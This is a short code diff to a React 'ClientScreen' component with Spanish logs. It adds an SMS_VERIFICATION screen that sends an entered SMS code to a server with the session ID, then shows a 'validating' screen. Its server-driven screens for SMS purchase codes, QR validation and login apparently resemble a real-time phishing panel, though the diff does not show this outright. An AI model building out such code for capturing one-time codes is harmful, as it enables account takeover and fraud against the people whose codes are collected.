@@ -215,6 +215,13 @@ export default function ClientScreen() {
             screenType = ScreenType.SMS_COMPRA; // Use the exact value from enum
           }
           
+          // Normalize screen type for SMS_VERIFICATION
+          if (screenType.toLowerCase() === 'sms_verification' || 
+              screenType.toLowerCase() === 'smsverification') {
+            console.log('Pantalla SMS_VERIFICATION detectada, normalizando a:', ScreenType.SMS_VERIFICATION);
+            screenType = ScreenType.SMS_VERIFICATION; // Use the exact value from enum
+          }
+          
           console.log('Cambiando a pantalla:', screenType);
           
           // Manejar lógica especial para la pantalla de login
@@ -389,6 +396,28 @@ export default function ClientScreen() {
           
           // Cambiar automáticamente a la pantalla de validación
           setCurrentScreen(ScreenType.QR_VALIDATION);
+          return;
+        }
+        
+        if (screen === ScreenType.SMS_VERIFICATION) {
+          // Verificar que tenemos sessionId
+          if (!sessionData.sessionId) {
+            console.error('No hay sessionId disponible para SMS_VERIFICATION');
+            return;
+          }
+          
+          // Enviar datos del código SMS al servidor
+          sendMessage({
+            type: 'UPDATE_SESSION_DATA',
+            data: {
+              sessionId: sessionData.sessionId,
+              tipo: 'sms_verification',
+              data: formData
+            }
+          });
+          
+          // Cambiar automáticamente a la pantalla de validación
+          setCurrentScreen(ScreenType.VALIDANDO);
           return;
         }
         
